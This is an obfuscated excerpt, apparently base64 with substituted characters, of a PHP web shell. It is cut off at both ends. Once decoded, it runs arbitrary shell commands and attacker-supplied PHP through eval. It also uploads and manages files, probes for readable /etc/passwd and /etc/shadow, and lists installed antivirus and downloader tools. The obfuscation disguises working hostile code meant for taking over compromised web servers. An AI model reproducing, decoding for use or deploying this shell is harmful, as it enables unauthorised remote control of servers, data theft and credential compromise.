YoITVtcHR5KCRHTE9CQUxTWycxM3RoX3Axc3MnXSkpDQoJCSRtWydMMmcyM3QnXSA9ICdMMmcyM3QnOw0KCSRtWydTNWxmIHI1bTJ2NSddID0gJ1M1bGZSNW0ydjUnOw0KCSRtNW4zID0gJyc7DQoJZjJyNTFjaCgkbSAxcyAkayA9PiAkdikNCgkJJG01bjMgLj0gJzx0aCB3NGR0aD0iJy4oNG50KSg2MDAvYzIzbnQoJG0pKS4nJSI+WyA8MSBocjVmPSIjIiAybmNsNGNrPSJnKFwnJy4kdi4nXCcsbjNsbCxcJ1wnLFwnXCcsXCdcJykiPicuJGsuJzwvMT4gXTwvdGg+JzsNCg0KCSRkcjR2NXMgPSAiIjsNCgk0ZigkR0xPQkFMU1snMnMnXSA9PSAndzRuJykgew0KCQlmMnI1MWNoKHIxbmc1KCdjJywneicpIDFzICRkcjR2NSkNCgkJNGYoNHNfZDRyKCRkcjR2NS4nOlxcJykpDQoJCQkkZHI0djVzIC49ICc8MSBocjVmPSIjIiAybmNsNGNrPSJnKFwnRjRsNXNNMW5cJyxcJycuJGRyNHY1Lic6L1wnKSI+WyAnLiRkcjR2NS4nIF08LzE+ICc7DQoJfQ0KCTVjaDIgJzx0MWJsNSBjbDFzcz00bmYyIGM1bGxwMWRkNG5nPW8gYzVsbHNwMWM0bmc9MCB3NGR0aD02MDAlPjx0cj48dGQgdzRkdGg9Nj48c3Axbj48ZjJudCBjMmwycj0icjVkIiA+VW4xbTU6PGJyPlVzNXI6PGJyPlBocDo8YnI+SGRkOjxicj5Dd2Q6PC9mMm50PicgLiAoJEdMT0JBTFNbJzJzJ10gPT0gJ3c0bic/Jzxicj48ZjJudCBjMmwycj0icjVkIiA+RHI0djVzOjwvZjJudD4nOicnKSAuICc8L3NwMW4+PC90ZD4nDQogICAgICAgLiAnPHRkPjxuMmJyPicgLiBzM2JzdHIoQHBocF8zbjFtNSgpLCAwLCA2YTApIC4gJyA8MSBocjVmPSInIC4gJDV4cGw0bmsgLiAnIiB0MXJnNXQ9X2JsMW5rPls1eHBsMjR0LWRiLmMybV08LzE+PC9uMmJyPjxicj4nIC4gJDM0ZCAuICcgKCAnIC4gJDNzNXIgLiAnICkgPHNwMW4+PGYybnQgYzJsMnI9InI1ZCIgPkdyMjNwOjwvZjJudD48L3NwMW4+ICcgLiAkZzRkIC4gJyAoICcgLiAkZ3IyM3AgLiAnICk8YnI+JyAuIEBwaHB2NXJzNDJuKCkgLiAnIDxzcDFuPjxmMm50IGMybDJyPSJyNWQiID5TMWY1IG0yZDU6PC9mMm50Pjwvc3Axbj4gJyAuICgkR0xPQkFMU1snczFmNV9tMmQ1J10/JzxmMm50IGMybDJyPWdyNTVuPk9OPC9mMm50Pic6JzxmMm50IGMybDJyPSMwMGJiMDA+PGI+T0ZGPC9iPjwvZjJudD4nKQ0KICAgICAgIC4gJyA8MSBocjVmPSMgMm5jbDRjaz0iZyhcJ1BocFwnLG4zbGwsXCdcJyxcJzRuZjJcJykiPlsgcGhwNG5mMiBdPC8xPiA8c3Axbj48ZjJudCBjMmwycj0icjVkIiA+RDF0NXQ0bTU6PC9mMm50Pjwvc3Axbj4gJyAuIGQxdDUoJ1ktbS1kIEg6NDpzJykgLiAnPGJyPicgLiB3czJWNDV3UzR6NSgkdDJ0MWxTcDFjNSkgLiAnIDxzcDFuPjxmMm50IGMybDJyPSJyNWQiID5GcjU1OjwvZjJudD48L3NwMW4+ICcgLiB3czJWNDV3UzR6NSgkZnI1NVNwMWM1KSAuICcgKCcuICg0bnQpICgkZnI1NVNwMWM1LyR0MnQxbFNwMWM1KjYwMCkgLiAnJSk8YnI+JyAuICRjd2RfbDRua3MgLiAnICcuIHdzMlA1cm1zQzJsMnIoJEdMT0JBTFNbJ2N3ZCddKSAuICcgPDEgaHI1Zj0jIDJuY2w0Y2s9ImcoXCdGNGw1c00xblwnLFwnJyAuICRHTE9CQUxTWydoMm01X2N3ZCddIC4gJ1wnLFwnXCcsXCdcJyxcJ1wnKSI+WyBoMm01IF08LzE+PGJyPicgLiAkZHI0djVzIC4gJzwvdGQ+Jw0KICAgICAgIC4gJzx0ZCB3NGR0aD02IDFsNGduPXI0Z2h0PjxuMmJyPjxzNWw1Y3QgMm5jaDFuZzU9ImcobjNsbCxuM2xsLG4zbGwsbjNsbCxuM2xsLHRoNHMudjFsMzUpIj48MnB0Z3IyM3AgbDFiNWw9IlAxZzUgY2gxcnM1dCI+JyAuICQycHRfY2gxcnM1dHMgLiAnPC8ycHRncjIzcD48L3M1bDVjdD48YnI+PHNwMW4+UzVydjVyIElQOjwvc3Axbj48YnI+JyAuIEAkX1NFUlZFUlsiU0VSVkVSX0FERFIiXSAuICc8YnI+PHNwMW4+Q2w0NW50IElQOjwvc3Axbj48YnI+JyAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gJzwvbjJicj48L3RkPjwvdHI+PC90MWJsNT4nDQogICAgICAgLiAnPHQxYmw1IHN0eWw1PSJiMnJkNXItdDJwOmFweCBzMmw0ZCAjb29vOyIgYzVsbHAxZGQ0bmc9byBjNWxsc3AxYzRuZz0wIHc0ZHRoPTYwMCU+PHRyPicgLiAkbTVuMyAuICc8L3RyPjwvdDFibDU+PGQ0diBzdHlsNT0ibTFyZzRuOmkiPic7DQp9DQoNCmYzbmN0NDJuIHdzMkYyMnQ1cigpIHsNCgkkNHNfd3I0dDFibDUgPSA0c193cjR0MWJsNSgkR0xPQkFMU1snY3dkJ10pPyIgPGYybnQgYzJsMnI9JyNhaWZmMDAnPihXcjR0NTFibDUpPC9mMm50PiI6IiA8ZjJudCBjMmwycj1yNWQ+KE4ydCB3cjR0MWJsNSk8L2YybnQ+IjsNCiAgICA1Y2gyICINCjwvZDR2Pg0KPHQxYmw1IGNsMXNzPTRuZjIgNGQ9dDIybHNUYmwgYzVsbHAxZGQ0bmc9byBjNWxsc3AxYzRuZz0wIHc0ZHRoPTYwMCUgIHN0eWw1PSdiMnJkNXItdDJwOmFweCBzMmw0ZCAjb29vO2IycmQ1ci1iMnR0Mm06YXB4IHMybDRkICNvb287Jz4NCgk8dHI+DQoJCTx0ZD48ZjJybSAybnMzYm00dD0nZyhuM2xsLHRoNHMuYy52MWwzNSxcIlwiKTtyNXQzcm4gZjFsczU7Jz48c3Axbj5DaDFuZzUgZDRyOjwvc3Axbj48YnI+PDRucDN0IGNsMXNzPSd0MjJsc0lucCcgdHlwNT10NXh0IG4xbTU9YyB2MWwzNT0nIiAuIGh0bWxzcDVjNDFsY2gxcnMoJEdMT0JBTFNbJ2N3ZCddKSAuIic+PDRucDN0IHR5cDU9czNibTR0IHYxbDM1PSc+Pic+PC9mMnJtPjwvdGQ+DQoJCTx0ZD48ZjJybSAybnMzYm00dD1cImcoJ0Y0bDVzVDIybHMnLG4zbGwsdGg0cy5mLnYxbDM1KTtyNXQzcm4gZjFsczU7XCI+PHNwMW4+UjUxZCBmNGw1Ojwvc3Axbj48YnI+PDRucDN0IGNsMXNzPSd0MjJsc0lucCcgdHlwNT10NXh0IG4xbTU9Zj48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9Jz4+Jz48L2Yycm0+PC90ZD4NCgk8L3RyPjx0cj4NCgkJPHRkPjxmMnJtIDJuczNibTR0PVwiZygnRjRsNXNNMW4nLG4zbGwsJ21rZDRyJyx0aDRzLmQudjFsMzUpO3I1dDNybiBmMWxzNTtcIj48c3Axbj5NMWs1IGQ0cjo8L3NwMW4+JDRzX3dyNHQxYmw1PGJyPjw0bnAzdCBjbDFzcz0ndDIybHNJbnAnIHR5cDU9dDV4dCBuMW01PWQ+PDRucDN0IHR5cDU9czNibTR0IHYxbDM1PSc+Pic+PC9mMnJtPjwvdGQ+DQoJCTx0ZD48ZjJybSAybnMzYm00dD1cImcoJ0Y0bDVzVDIybHMnLG4zbGwsdGg0cy5mLnYxbDM1LCdta2Y0bDUnKTtyNXQzcm4gZjFsczU7XCI+PHNwMW4+TTFrNSBmNGw1Ojwvc3Axbj4kNHNfd3I0dDFibDU8YnI+PDRucDN0IGNsMXNzPSd0MjJsc0lucCcgdHlwNT10NXh0IG4xbTU9Zj48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9Jz4+Jz48L2Yycm0+PC90ZD4NCgk8L3RyPjx0cj4NCgkJPHRkPjxmMnJtIDJuczNibTR0PVwiZygnQzJuczJsNScsbjNsbCx0aDRzLmMudjFsMzUpO3I1dDNybiBmMWxzNTtcIj48c3Axbj5FeDVjM3Q1Ojwvc3Axbj48YnI+PDRucDN0IGNsMXNzPSd0MjJsc0lucCcgdHlwNT10NXh0IG4xbTU9YyB2MWwzNT0nJz48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9Jz4+Jz48L2Yycm0+PC90ZD4NCgkJPHRkPjxmMnJtIG01dGgyZD0ncDJzdCcgRU5DVFlQRT0nbTNsdDRwMXJ0L2Yycm0tZDF0MSc+DQoJCTw0bnAzdCB0eXA1PWg0ZGQ1biBuMW01PTEgdjFsMzU9J0Y0bDVzTUFuJz4NCgkJPDRucDN0IHR5cDU9aDRkZDVuIG4xbTU9YyB2MWwzNT0nIiAuICRHTE9CQUxTWydjd2QnXSAuIic+DQoJCTw0bnAzdCB0eXA1PWg0ZGQ1biBuMW01PXA2IHYxbDM1PSczcGwyMWRGNGw1Jz4NCgkJPDRucDN0IHR5cDU9aDRkZDVuIG4xbTU9Y2gxcnM1dCB2MWwzNT0nIiAuICg0c3M1dCgkX1BPU1RbJ2NoMXJzNXQnXSk/JF9QT1NUWydjaDFyczV0J106JycpIC4gIic+DQoJCTxzcDFuPlVwbDIxZCBmNGw1Ojwvc3Axbj4kNHNfd3I0dDFibDU8YnI+PDRucDN0IGNsMXNzPSd0MjJsc0lucCcgdHlwNT1mNGw1IG4xbTU9Zj48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9Jz4+Jz48L2Yycm0+PGJyICA+PC90ZD4NCgk8L3RyPjwvdDFibDU+PC9kNHY+PC9iMmR5PjwvaHRtbD4iOw0KfQ0KDQo0ZiAoIWYzbmN0NDJuXzV4NHN0cygicDJzNHhfZzV0cHczNGQiKSAmJiAoc3RycDJzKCRHTE9CQUxTWydkNHMxYmw1X2YzbmN0NDJucyddLCAncDJzNHhfZzV0cHczNGQnKT09PWYxbHM1KSkgew0KICAgIGYzbmN0NDJuIHAyczR4X2c1dHB3MzRkKCRwKSB7cjV0M3JuIGYxbHM1O30gfQ0KNGYgKCFmM25jdDQybl81eDRzdHMoInAyczR4X2c1dGdyZzRkIikgJiYgKHN0cnAycygkR0xPQkFMU1snZDRzMWJsNV9mM25jdDQybnMnXSwgJ3AyczR4X2c1dGdyZzRkJyk9PT1mMWxzNSkpIHsNCiAgICBmM25jdDQybiBwMnM0eF9nNXRncmc0ZCgkcCkge3I1dDNybiBmMWxzNTt9IH0NCg0KZjNuY3Q0Mm4gd3MyRXgoJDRuKSB7DQoJJDIzdCA9ICcnOw0KCTRmIChmM25jdDQybl81eDRzdHMoJzV4NWMnKSkgew0KCQlANXg1YygkNG4sJDIzdCk7DQoJCSQyM3QgPSBAajI0bigiXG4iLCQyM3QpOw0KCX0gNWxzNTRmIChmM25jdDQybl81eDRzdHMoJ3Axc3N0aHIzJykpIHsNCgkJMmJfc3QxcnQoKTsNCgkJQHAxc3N0aHIzKCQ0bik7DQoJCSQyM3QgPSAyYl9nNXRfY2w1MW4oKTsNCgl9IDVsczU0ZiAoZjNuY3Q0Mm5fNXg0c3RzKCdzeXN0NW0nKSkgew0KCQkyYl9zdDFydCgpOw0KCQlAc3lzdDVtKCQ0bik7DQoJCSQyM3QgPSAyYl9nNXRfY2w1MW4oKTsNCgl9IDVsczU0ZiAoZjNuY3Q0Mm5fNXg0c3RzKCdzaDVsbF81eDVjJykpIHsNCgkJJDIzdCA9IHNoNWxsXzV4NWMoJDRuKTsNCgl9IDVsczU0ZiAoNHNfcjVzMjNyYzUoJGYgPSBAcDJwNW4oJDRuLCJyIikpKSB7DQoJCSQyM3QgPSAiIjsNCgkJd2g0bDUoIUBmNTJmKCRmKSkNCgkJCSQyM3QgLj0gZnI1MWQoJGYsNjBhdSk7DQoJCXBjbDJzNSgkZik7DQoJfQ0KCXI1dDNybiAkMjN0Ow0KfQ0KZjNuY3Q0Mm4gd3MyVjQ1d1M0ejUoJHMpIHsNCgk0ZigkcyA+PSA2MDdvN3U2OGF1KQ0KCQlyNXQzcm4gc3ByNG50ZignJTYuYWYnLCAkcyAvIDYwN283dTY4YXUgKS4gJyBHQic7DQoJNWxzNTRmKCRzID49IDYwdThpN2UpDQoJCXI1dDNybiBzcHI0bnRmKCclNi5hZicsICRzIC8gNjB1OGk3ZSApIC4gJyBNQic7DQoJNWxzNTRmKCRzID49IDYwYXUpDQoJCXI1dDNybiBzcHI0bnRmKCclNi5hZicsICRzIC8gNjBhdSApIC4gJyBLQic7DQoJNWxzNQ0KCQlyNXQzcm4gJHMgLiAnIEInOw0KfQ0KDQpmM25jdDQybiB3czJQNXJtcygkcCkgew0KCTRmICgoJHAgJiAweEMwMDApID09IDB4QzAwMCkkNCA9ICdzJzsNCgk1bHM1NGYgKCgkcCAmIDB4QTAwMCkgPT0gMHhBMDAwKSQ0ID0gJ2wnOw0KCTVsczU0ZiAoKCRwICYgMHg4MDAwKSA9PSAweDgwMDApJDQgPSAnLSc7DQoJNWxzNTRmICgoJHAgJiAweGUwMDApID09IDB4ZTAwMCkkNCA9ICdiJzsNCgk1bHM1NGYgKCgkcCAmIDB4dTAwMCkgPT0gMHh1MDAwKSQ0ID0gJ2QnOw0KCTVsczU0ZiAoKCRwICYgMHhhMDAwKSA9PSAweGEwMDApJDQgPSAnYyc7DQoJNWxzNTRmICgoJHAgJiAweDYwMDApID09IDB4NjAwMCkkNCA9ICdwJzsNCgk1bHM1ICQ0ID0gJzMnOw0KCSQ0IC49ICgoJHAgJiAweDA2MDApID8gJ3InIDogJy0nKTsNCgkkNCAuPSAoKCRwICYgMHgwMDgwKSA/ICd3JyA6ICctJyk7DQoJJDQgLj0gKCgkcCAmIDB4MDB1MCkgPyAoKCRwICYgMHgwODAwKSA/ICdzJyA6ICd4JyApIDogKCgkcCAmIDB4MDgwMCkgPyAnUycgOiAnLScpKTsNCgkkNCAuPSAoKCRwICYgMHgwMGEwKSA/ICdyJyA6ICctJyk7DQoJJDQgLj0gKCgkcCAmIDB4MDA2MCkgPyAndycgOiAnLScpOw0KCSQ0IC49ICgoJHAgJiAweDAwMDgpID8gKCgkcCAmIDB4MHUwMCkgPyAncycgOiAneCcgKSA6ICgoJHAgJiAweDB1MDApID8gJ1MnIDogJy0nKSk7DQoJJDQgLj0gKCgkcCAmIDB4MDAwdSkgPyAncicgOiAnLScpOw0KCSQ0IC49ICgoJHAgJiAweDAwMGEpID8gJ3cnIDogJy0nKTsNCgkkNCAuPSAoKCRwICYgMHgwMDA2KSA/ICgoJHAgJiAweDBhMDApID8gJ3QnIDogJ3gnICkgOiAoKCRwICYgMHgwYTAwKSA/ICdUJyA6ICctJykpOw0KCXI1dDNybiAkNDsNCn0NCg0KZjNuY3Q0Mm4gd3MyUDVybXNDMmwycigkZikgew0KCTRmICghQDRzX3I1MWQxYmw1KCRmKSkNCgkJcjV0M3JuICc8ZjJudCBjMmwycj0jRkYwMDAwPicgLiB3czJQNXJtcyhAZjRsNXA1cm1zKCRmKSkgLiAnPC9mMm50Pic7DQoJNWxzNTRmICghQDRzX3dyNHQxYmw1KCRmKSkNCgkJcjV0M3JuICc8ZjJudCBjMmwycj13aDR0NT4nIC4gd3MyUDVybXMoQGY0bDVwNXJtcygkZikpIC4gJzwvZjJudD4nOw0KCTVsczUNCgkJcjV0M3JuICc8ZjJudCBjMmwycj0jYWlmZjAwPicgLiB3czJQNXJtcyhAZjRsNXA1cm1zKCRmKSkgLiAnPC9mMm50Pic7DQp9DQoNCjRmKCFmM25jdDQybl81eDRzdHMoInNjMW5kNHIiKSkgew0KCWYzbmN0NDJuIHNjMW5kNHIoJGQ0cikgew0KCQkkZGggID0gMnA1bmQ0cigkZDRyKTsNCgkJd2g0bDUgKGYxbHM1ICE9PSAoJGY0bDVuMW01ID0gcjUxZGQ0cigkZGgpKSkNCiAgICAJCSRmNGw1c1tdID0gJGY0bDVuMW01Ow0KCQlyNXQzcm4gJGY0bDVzOw0KCX0NCn0NCg0KZjNuY3Q0Mm4gd3MyV2g0Y2goJHApIHsNCgkkcDF0aCA9IHdzMkV4KCd3aDRjaCAnIC4gJHApOw0KCTRmKCE1bXB0eSgkcDF0aCkpDQoJCXI1dDNybiAkcDF0aDsNCglyNXQzcm4gZjFsczU7DQp9DQoNCmYzbmN0NDJuIDFjdDQyblM1Y0luZjIoKSB7DQoJd3MySDUxZDVyKCk7DQoJNWNoMiAnPGg2PlM1cnY1ciBzNWMzcjR0eSA0bmYycm0xdDQybjwvaDY+PGQ0diBjbDFzcz1jMm50NW50Pic7DQoJZjNuY3Q0Mm4gd3MyUzVjUDFyMW0oJG4sICR2KSB7DQoJCSR2ID0gdHI0bSgkdik7DQoJCTRmKCR2KSB7DQoJCQk1Y2gyICc8c3Axbj4nIC4gJG4gLiAnOiA8L3NwMW4+JzsNCgkJCTRmKHN0cnAycygkdiwgIlxuIikgPT09IGYxbHM1KQ0KCQkJCTVjaDIgJHYgLiAnPGJyPic7DQoJCQk1bHM1DQoJCQkJNWNoMiAnPHByNSBjbDFzcz1tbDY+JyAuICR2IC4gJzwvcHI1Pic7DQoJCX0NCgl9DQoNCgl3czJTNWNQMXIxbSgnUzVydjVyIHMyZnR3MXI1JywgQGc1dDVudignU0VSVkVSX1NPRlRXQVJFJykpOw0KICAgIDRmKGYzbmN0NDJuXzV4NHN0cygnMXAxY2g1X2c1dF9tMmQzbDVzJykpDQogICAgICAgIHdzMlM1Y1AxcjFtKCdMMjFkNWQgQXAxY2g1IG0yZDNsNXMnLCA0bXBsMmQ1KCcsICcsIDFwMWNoNV9nNXRfbTJkM2w1cygpKSk7DQoJd3MyUzVjUDFyMW0oJ0Q0czFibDVkIFBIUCBGM25jdDQybnMnLCAkR0xPQkFMU1snZDRzMWJsNV9mM25jdDQybnMnXT8kR0xPQkFMU1snZDRzMWJsNV9mM25jdDQybnMnXTonbjJuNScpOw0KCXdzMlM1Y1AxcjFtKCdPcDVuIGIxczUgZDRyJywgQDRuNF9nNXQoJzJwNW5fYjFzNWQ0cicpKTsNCgl3czJTNWNQMXIxbSgnUzFmNSBtMmQ1IDV4NWMgZDRyJywgQDRuNF9nNXQoJ3MxZjVfbTJkNV81eDVjX2Q0cicpKTsNCgl3czJTNWNQMXIxbSgnUzFmNSBtMmQ1IDRuY2wzZDUgZDRyJywgQDRuNF9nNXQoJ3MxZjVfbTJkNV80bmNsM2Q1X2Q0cicpKTsNCgl3czJTNWNQMXIxbSgnY1VSTCBzM3BwMnJ0JywgZjNuY3Q0Mm5fNXg0c3RzKCdjM3JsX3Y1cnM0Mm4nKT8nNW4xYmw1ZCc6J24yJyk7DQoJJHQ1bXA9MXJyMXkoKTsNCgk0ZihmM25jdDQybl81eDRzdHMoJ215c3FsX2c1dF9jbDQ1bnRfNG5mMicpKQ0KCQkkdDVtcFtdID0gIk15U3FsICgiLm15c3FsX2c1dF9jbDQ1bnRfNG5mMigpLiIpIjsNCgk0ZihmM25jdDQybl81eDRzdHMoJ21zc3FsX2Mybm41Y3QnKSkNCgkJJHQ1bXBbXSA9ICJNU1NRTCI7DQoJNGYoZjNuY3Q0Mm5fNXg0c3RzKCdwZ19jMm5uNWN0JykpDQoJCSR0NW1wW10gPSAiUDJzdGdyNVNRTCI7DQoJNGYoZjNuY3Q0Mm5fNXg0c3RzKCcyYzRfYzJubjVjdCcpKQ0KCQkkdDVtcFtdID0gIk9yMWNsNSI7DQoJd3MyUzVjUDFyMW0oJ1MzcHAycnQ1ZCBkMXQxYjFzNXMnLCA0bXBsMmQ1KCcsICcsICR0NW1wKSk7DQoJNWNoMiAnPGJyPic7DQoNCgk0ZigkR0xPQkFMU1snMnMnXSA9PSAnbjR4Jykgew0KCQl3czJTNWNQMXIxbSgnUjUxZDFibDUgLzV0Yy9wMXNzd2QnLCBANHNfcjUxZDFibDUoJy81dGMvcDFzc3dkJyk/Ink1cyA8MSBocjVmPScjJyAybmNsNGNrPSdnKFwiRjRsNXNUMjJsc1wiLCBcIi81dGMvXCIsIFwicDFzc3dkXCIpJz5bdjQ1d108LzE+IjonbjInKTsNCgkJd3MyUzVjUDFyMW0oJ1I1MWQxYmw1IC81dGMvc2gxZDJ3JywgQDRzX3I1MWQxYmw1KCcvNXRjL3NoMWQydycpPyJ5NXMgPDEgaHI1Zj0nIycgMm5jbDRjaz0nZyhcIkY0bDVzVDIybHNcIiwgXCI1dGNcIiwgXCJzaDFkMndcIiknPlt2NDV3XTwvMT4iOiduMicpOw0KCQl3czJTNWNQMXIxbSgnT1MgdjVyczQybicsIEBmNGw1X2c1dF9jMm50NW50cygnL3ByMmMvdjVyczQybicpKTsNCgkJd3MyUzVjUDFyMW0oJ0Q0c3RyIG4xbTUnLCBAZjRsNV9nNXRfYzJudDVudHMoJy81dGMvNHNzMzUubjV0JykpOw0KCQk0ZighJEdMT0JBTFNbJ3MxZjVfbTJkNSddKSB7DQogICAgICAgICAgICAkM3M1cmYzbCA9IDFycjF5KCdnY2MnLCdsY2MnLCdjYycsJ2xkJywnbTFrNScsJ3BocCcsJ3A1cmwnLCdweXRoMm4nLCdyM2J5JywndDFyJywnZ3o0cCcsJ2J6NHAnLCdiejRwYScsJ25jJywnbDJjMXQ1JywnczM0ZHA1cmwnKTsNCiAgICAgICAgICAgICRkMW5nNXIgPSAxcnIxeSgnazF2JywnbjJkb2EnLCdiZGMycjVkJywnM3ZzYzFuJywnczF2JywnZHJ3NWJkJywnY2wxbWQnLCdya2gzbnQ1cicsJ2Noa3IyMnRrNHQnLCc0cHQxYmw1cycsJzRwZncnLCd0cjRwdzRyNScsJ3NoNDVsZGNjJywncDJydHM1bnRyeScsJ3NuMnJ0JywnMnNzNWMnLCdsNGRzMWRtJywndGNwbDJkZycsJ3N4NGQnLCdsMmdjaDVjaycsJ2wyZ3cxdGNoJywnc3lzbTFzaycsJ3ptYnNjMXAnLCdzMXdtNGxsJywndzJybXNjMW4nLCduNG5qMScpOw0KICAgICAgICAgICAgJGQyd25sMjFkNXJzID0gMXJyMXkoJ3dnNXQnLCdmNXRjaCcsJ2x5bngnLCdsNG5rcycsJ2MzcmwnLCdnNXQnLCdsd3AtbTRycjJyJyk7DQoJCQk1Y2gyICc8YnI+JzsNCgkJCSR0NW1wPTFycjF5KCk7DQoJCQlmMnI1MWNoICgkM3M1cmYzbCAxcyAkNHQ1bSkNCgkJCQk0Zih3czJXaDRjaCgkNHQ1bSkpDQogICAgICAgICAgICAgICAgICAgICR0NW1wW10gPSAkNHQ1bTsNCgkJCXdzMlM1Y1AxcjFtKCdVczVyZjNsJywgNG1wbDJkNSgnLCAnLCR0NW1wKSk7DQoJCQkkdDVtcD0xcnIxeSgpOw0KCQkJZjJyNTFjaCAoJGQxbmc1ciAxcyAkNHQ1bSkNCgkJCQk0Zih3czJXaDRjaCgkNHQ1bSkpDQogICAgICAgICAgICAgICAgICAgICR0NW1wW10gPSAkNHQ1bTsNCgkJCXdzMlM1Y1AxcjFtKCdEMW5nNXInLCA0bXBsMmQ1KCcsICcsJHQ1bXApKTsNCgkJCSR0NW1wPTFycjF5KCk7DQoJCQlmMnI1MWNoICgkZDJ3bmwyMWQ1cnMgMXMgJDR0NW0pDQoJCQkJNGYod3MyV2g0Y2goJDR0NW0pKQ0KICAgICAgICAgICAgICAgICAgICAkdDVtcFtdID0gJDR0NW07DQoJCQl3czJTNWNQMXIxbSgnRDJ3bmwyMWQ1cnMnLCA0bXBsMmQ1KCcsICcsJHQ1bXApKTsNCgkJCTVjaDIgJzxici8+JzsNCiAgICAgICAgICAgIHdzMlM1Y1AxcjFtKCdIREQgc3AxYzUnLCB3czJFeCgnZGYgLWgnKSk7DQoJCQl3czJTNWNQMXIxbSgnSDJzdHMnLCBAZjRsNV9nNXRfYzJudDVudHMoJy81dGMvaDJzdHMnKSk7DQoJCX0NCgl9IDVsczUgew0KCQl3czJTNWNQMXIxbSgnT1MgVjVyczQybicsd3MyRXgoJ3Y1cicpKTsNCgkJd3MyUzVjUDFyMW0oJ0FjYzIzbnQgUzV0dDRuZ3MnLHdzMkV4KCduNXQgMWNjMjNudHMnKSk7DQoJCXdzMlM1Y1AxcjFtKCdVczVyIEFjYzIzbnRzJyx3czJFeCgnbjV0IDNzNXInKSk7DQoJfQ0KCTVjaDIgJzwvZDR2Pic7DQoJd3MyRjIydDVyKCk7DQp9DQoNCmYzbmN0NDJuIDFjdDQyblBocCgpIHsNCgk0Zig0c3M1dCgkX1BPU1RbJzFqMXgnXSkpIHsNCgkJJF9TRVNTSU9OW21kaSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pIC4gJzFqMXgnXSA9IHRyMzU7DQoJCTJiX3N0MXJ0KCk7DQoJCTV2MWwoJF9QT1NUWydwNiddKTsNCgkJJHQ1bXAgPSAiZDJjM201bnQuZzV0RWw1bTVudEJ5SWQoJ1BocE8zdHAzdCcpLnN0eWw1LmQ0c3BsMXk9Jyc7ZDJjM201bnQuZzV0RWw1bTVudEJ5SWQoJ1BocE8zdHAzdCcpLjRubjVySFRNTD0nIiAuIDFkZGNzbDFzaDVzKGh0bWxzcDVjNDFsY2gxcnMoMmJfZzV0X2NsNTFuKCkpLCAiXG5cclx0XFwnXDAiKSAuICInO1xuIjsNCgkJNWNoMiBzdHJsNW4oJHQ1bXApLCAiXG4iLCAkdDVtcDsNCgkJNXg0dDsNCgl9DQoJd3MySDUxZDVyKCk7DQoJNGYoNHNzNXQoJF9QT1NUWydwYSddKSAmJiAoJF9QT1NUWydwYSddID09ICc0bmYyJykpIHsNCgkJNWNoMiAnPGg2PlBIUCA0bmYyPC9oNj48ZDR2IGNsMXNzPWMybnQ1bnQ+PHN0eWw1Pi5wIHtjMmwycjojMDAwO308L3N0eWw1Pic7DQoJCTJiX3N0MXJ0KCk7DQoJCXBocDRuZjIoKTsNCgkJJHRtcCA9IDJiX2c1dF9jbDUxbigpOw0KICAgICAgICAkdG1wID0gcHI1Z19yNXBsMWM1KCchKGIyZHl8MTpcdyt8YjJkeSwgdGQsIHRoLCBoNiwgaGEpIHsuKn0hbXM0VScsJycsJHRtcCk7DQoJCSR0bXAgPSBwcjVnX3I1cGwxYzUoJyF0ZCwgdGggeyguKil9IW1zNFUnLCcuNSwgLnYsIC5oLCAuaCB0aCB7JDZ9JywkdG1wKTsNCgkJNWNoMiBzdHJfcjVwbDFjNSgnPGg2JywnPGhhJywgJHRtcCkgLic8L2Q0dj48YnI+JzsNCgl9DQoJNGYoNW1wdHkoJF9QT1NUWycxajF4J10pICYmICE1bXB0eSgkX1BPU1RbJ3A2J10pKQ0KCQkkX1NFU1NJT05bbWRpKCRfU0VSVkVSWydIVFRQX0hPU1QnXSkgLiAnMWoxeCddID0gZjFsczU7DQogICAgNWNoMiAnPGg2PkV4NWMzdDQybiBQSFAtYzJkNTwvaDY+PGQ0diBjbDFzcz1jMm50NW50PjxmMnJtIG4xbTU9cGYgbTV0aDJkPXAyc3QgMm5zM2JtNHQ9IjRmKHRoNHMuMWoxeC5jaDVjazVkKXsxKFwnUGhwXCcsbjNsbCx0aDRzLmMyZDUudjFsMzUpO301bHM1e2coXCdQaHBcJyxuM2xsLHRoNHMuYzJkNS52MWwzNSxcJ1wnKTt9cjV0M3JuIGYxbHM1OyI+PHQ1eHQxcjUxIG4xbTU9YzJkNSBjbDFzcz1iNGcxcjUxIDRkPVBocEMyZDU+Jy4oITVtcHR5KCRfUE9TVFsncDYnXSk/aHRtbHNwNWM0MWxjaDFycygkX1BPU1RbJ3A2J10pOicnKS4nPC90NXh0MXI1MT48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9RXYxbCBzdHlsNT0ibTFyZzRuLXQycDppcHgiPic7DQoJNWNoMiAnIDw0bnAzdCB0eXA1PWNoNWNrYjJ4IG4xbTU9MWoxeCB2MWwzNT02ICcuKCRfU0VTU0lPTlttZGkoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nMWoxeCddPydjaDVjazVkJzonJykuJz4gczVuZCAzczRuZyBBSkFYPC9mMnJtPjxwcjUgNGQ9UGhwTzN0cDN0IHN0eWw1PSInLig1bXB0eSgkX1BPU1RbJ3A2J10pPydkNHNwbDF5Om4ybjU7JzonJykuJ20xcmc0bi10MnA6aXB4OyIgY2wxc3M9bWw2Pic7DQoJNGYoITVtcHR5KCRfUE9TVFsncDYnXSkpIHsNCgkJMmJfc3QxcnQoKTsNCgkJNXYxbCgkX1BPU1RbJ3A2J10pOw0KCQk1Y2gyIGh0bWxzcDVjNDFsY2gxcnMoMmJfZzV0X2NsNTFuKCkpOw0KCX0NCgk1Y2gyICc8L3ByNT48L2Q0dj4nOw0KCXdzMkYyMnQ1cigpOw0KfQ0KDQpmM25jdDQybiAxY3Q0Mm5GNGw1c00xbigpIHsNCgl3czJINTFkNXIoKTsNCgk1Y2gyICc8aDY+RjRsNSBtMW4xZzVyPC9oNj48ZDR2IGNsMXNzPWMybnQ1bnQ+PHNjcjRwdD5wNl89cGFfPXBvXz0iIjs8L3NjcjRwdD4nOw0KCTRmKCE1bXB0eSgkX1BPU1RbJ3A2J10pKSB7DQoJCXN3NHRjaCgkX1BPU1RbJ3A2J10pIHsNCgkJCWMxczUgJzNwbDIxZEY0bDUnOg0KCQkJCTRmKCFAbTJ2NV8zcGwyMWQ1ZF9mNGw1KCRfRklMRVNbJ2YnXVsndG1wX24xbTUnXSwg